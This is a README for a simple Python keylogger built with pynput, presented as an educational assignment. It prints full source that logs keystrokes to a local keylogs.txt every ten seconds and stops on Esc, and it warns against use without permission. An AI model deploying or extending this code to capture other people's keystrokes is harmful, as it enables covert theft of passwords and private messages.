# Keylogger Project

This project contains a simple keylogger (keyboard listener) application written in Python. It enables users to record keystrokes to a text file at specified intervals (e.g., every 10 seconds).

> **Warning**  
> This project is intended for **educational** and **assignment** purposes only. Tools like keyloggers can constitute illegal activity if misused. Use this project solely on your own devices and with proper permission from the relevant parties.

## Features

- Logs keyboard input into `keylogs.txt` every predefined interval (e.g., 10 seconds).
- Special keys (Enter, Tab, Space, Backspace) are handled and recorded in a readable format.
- Arrow keys and other system keys are not recorded.
- The listener stops when the **Esc** key is pressed.

## Installation

1. **Python Version**  
   This project requires Python 3 or later.

2. **Required Libraries**  
   - [pynput](https://pypi.org/project/pynput/)  
     ```
     pip install pynput
     ```

3. **Clone or Download the Project**  
   Save these files to a folder or clone the repository.

## Usage

1. Open the `keylogger.py` file.
2. Adjust the `interval` variable (default is 10 seconds) to your desired value:  
   ```python
   interval = 10  # Time interval (in seconds) for logging data
   ```
3. Run the application from the command line/terminal:  
   ```bash
   python keylogger.py
   ```
4. Once the program starts, it will collect keystrokes. Every **interval** seconds, the data will be appended to the `keylogs.txt` file.
5. To stop the program, press the **Esc** key.

## Code Explanation

```python
from pynput import keyboard
import threading

text = ""
interval = 10  # Interval in seconds for writing logs to the file

def send():
    global text
    try:
        with open("keylogs.txt", "a") as f:
            f.write(text)
        print("Data has been written to the file.")
        text = ""  # Reset text after writing to the file
        timer = threading.Timer(interval, send)
        timer.start()
    except Exception as e:
        print("An error occurred while sending data:", e)

def on_press(key):
    global text
    # Handle special keys
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace:
        if len(text) > 0:
            text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # Capture and record normal character keys
        try:
            char = key.char
            if char is not None:
                text += char
        except AttributeError:
            # Ignore special keys (e.g., arrow keys)
            pass

with keyboard.Listener(on_press=on_press) as listener:
    send()  # Start sending logs at the specified interval
    listener.join()
```

### Important Points
- When `keylogger.py` is running, the file **keylogs.txt** will be created (if not already existing) in the same directory.  
- `keylogs.txt` is opened in **append** mode, so each log is added to the end of the file.  
- Check the contents of `keylogs.txt` periodically to review the captured data.

- Only run this application on systems you own or where you have explicit permission.  
- Using a keylogger without the ownerâ€™s knowledge is illegal in many jurisdictions.
